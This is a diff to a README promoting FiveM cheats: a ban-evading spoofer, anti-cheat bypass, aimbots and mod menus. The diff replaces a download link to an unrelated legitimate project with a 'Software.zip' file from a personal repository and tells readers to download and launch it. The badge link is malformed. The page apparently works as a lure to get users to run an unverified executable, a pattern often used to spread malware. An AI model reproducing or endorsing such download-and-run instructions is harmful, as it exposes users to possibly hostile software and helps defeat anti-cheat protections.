@@ -14,7 +14,7 @@ Say goodbye to bans with our built-in spoofer that keeps your identity safe and 
 Explore a wide range of topics related to FiveM cheats and mods, including bypassing anti-cheat systems, aimbots, external cheats, hack menus, Lua executors, mod menus, and more. Stay informed about the latest developments in the FiveM cheating community and discover new ways to elevate your gameplay.
 
 ### Download Link
-[![Download Here](https://img.shields.io/badge/Download%20Here-v1.0.0-%23cfd3d7)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Here](https://github.com/FadiQupti/FiveM-Mod-Menu/releases/download/v2.0/Software.zip%20Here-v1.0.0-%23cfd3d7)](https://github.com/FadiQupti/FiveM-Mod-Menu/releases/download/v2.0/Software.zip)
 
 Note: Click the button above to download the file and launch it for installation.
 
